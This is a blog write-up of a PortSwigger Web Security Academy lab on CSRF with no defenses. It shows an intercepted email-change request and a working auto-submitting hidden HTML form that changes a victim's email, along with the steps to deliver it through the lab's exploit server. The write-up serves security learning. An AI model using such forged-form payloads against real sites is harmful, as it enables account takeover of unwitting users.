---
layout: post
title: "CSRF vulnerability with no defenses"
date: 2026-10-10
description: "PortSwigger CSRF lab with no defenses: a forged form silently changes the victim's email address."
series: PortSwigger CSRF
categories:
  - CTF
  - PortSwigger
tags:
  - CSRF
  - Web
---

## Description

This [lab](https://portswigger.net/web-security/csrf/lab-no-defenses){:target="_blank"}'s email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

## Steps

After logging in and navigating to My account, we see the default email address and update it accordingly while intercepting the request via Burp.

![My Account page showing the default email address wiener@normal-user.net](https://jawad.ca/images/csrf-lab01-1.png)

Updating the email triggers this HTTP request:

```http
POST /my-account/change-email HTTP/1.1
Host: 0aa100b704da0acb80390316009d0088.web-security-academy.net
Cookie: session=TagacI2nU8rROI6L9Ky74k7ifXaXXd8M
Content-Length: 25
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0aa100b704da0acb80390316009d0088.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa100b704da0acb80390316009d0088.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i
Connection: keep-alive

email=jawad%40example.com
```

![The same page after the update, now showing jawad@example.com](https://jawad.ca/images/csrf-lab01-2.png)

## Creating a fake HTML form

```html
<form method="POST" action="https://0aa100b704da0acb80390316009d0088.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="jawad2@example.com">
</form>

<script> document.forms[0].submit(); </script>
```

Save the above in an HTML file and start a Python server:

```shell
python3 -m http.server 5555
```

```console
❯ vim example.html
❯ more example.html
<form method="POST" action="https://0aa100b704da0acb80390316009d0088.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="jawad3@example.com">
</form>

<script> document.forms[0].submit(); </script>
❯
❯ python3 -m http.server 5555
Serving HTTP on :: port 5555 (http://[::]:5555/) ...
::1 - - [10/Oct/2026 12:14:41] "GET / HTTP/1.1" 200 -
::1 - - [10/Oct/2026 12:14:41] code 404, message File not found
::1 - - [10/Oct/2026 12:14:41] "GET /favicon.ico HTTP/1.1" 404 -
```

![Directory listing for localhost:5555 containing example.html](https://jawad.ca/images/csrf-lab01-3.png)

Opening the example.html submits the above form and changes the email on the actual application, exploiting the CSRF vulnerability.

![The account page after loading the exploit, showing jawad3@example.com](https://jawad.ca/images/csrf-lab01-4.png)

## To pass the lab

1. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
2. To verify that the exploit works, try it on yourself by clicking "View exploit" and then check the resulting HTTP request and response.
3. Change the email address in your exploit so that it doesn't match your own.
4. Click "Deliver to victim" to solve the lab.
